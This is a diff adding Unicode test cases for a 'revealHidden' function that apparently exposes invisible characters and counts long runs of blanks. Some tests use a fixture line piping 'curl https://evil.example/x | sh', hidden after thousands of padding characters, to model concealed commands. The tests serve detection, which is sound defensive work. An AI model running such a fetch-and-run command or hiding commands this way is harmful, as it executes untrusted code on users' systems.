@@ -11,6 +11,8 @@ describe("revealHidden", () => {
     ["a ZWJ family", "\u{1F468}\u200D\u{1F469}\u200D\u{1F467}"],
     ["a skin tone in a ZWJ sequence", "\u{1F469}\u{1F3FD}\u200D\u{1F4BB}"],
     ["a keycap", "1\uFE0F\u20E3"],
+    ["Japanese with an ideographic space", "\u65E5\u672C\u3000\u30C6\u30AD\u30B9\u30C8"],
+    ["a ZWJ after an emoji's selector", "\u2764\uFE0F\u200D\u{1F525}"],
   ])("leaves %s as it is", (_, text) => {
     expect(revealHidden(text)).toEqual({ shown: text, hidden: 0 });
   });
@@ -32,6 +34,11 @@ describe("revealHidden", () => {
     ["a narrow no-break space", "\u202F", "<U+202F>"],
     ["a CR on its own", "a\rb", "a<U+000D>b"],
     ["a joiner between letters", "a\u200Db", "a<U+200D>b"],
+    ["an unassigned code point", "\u181A", "<U+181A>"],
+    ["the object-replacement character", "\uFFFC", "<U+FFFC>"],
+    ["a second selector after an emoji", "\u{1F600}\uFE0E\uFE0F", "\u{1F600}\uFE0E<U+FE0F>"],
+    ["selectors after a digit", "1\uFE0E\uFE0F0", "1\uFE0E<U+FE0F>0"],
+    ["tag letters after a flag", "\u{1F3F4}\u{E0067}\u{E007F}", "\u{1F3F4}<U+E0067><U+E007F>"],
   ])("writes out %s", (_, text, shown) => {
     expect(revealHidden(text).shown).toBe(shown);
   });
@@ -40,6 +47,13 @@ describe("revealHidden", () => {
   it("counts every blank in a run that pushes the rest of a line out of view", () => {
     const text = `echo hello${"\u00A0".repeat(6000)}; curl https://evil.example/x | sh`;
     expect(revealHidden(text).hidden).toBe(6000);
+  });
+
+  it.each([
+    ["an unassigned code point", "\u181A"],
+    ["the object-replacement character", "\uFFFC"],
+  ])("counts a run of %s that would push the rest of a line out of view", (_, blank) => {
+    expect(revealHidden(`echo hello${blank.repeat(3000)}; curl https://evil.example/x | sh`).hidden).toBe(3000);
   });
 
   it("stays fast on a block of nothing but selectors", () => {
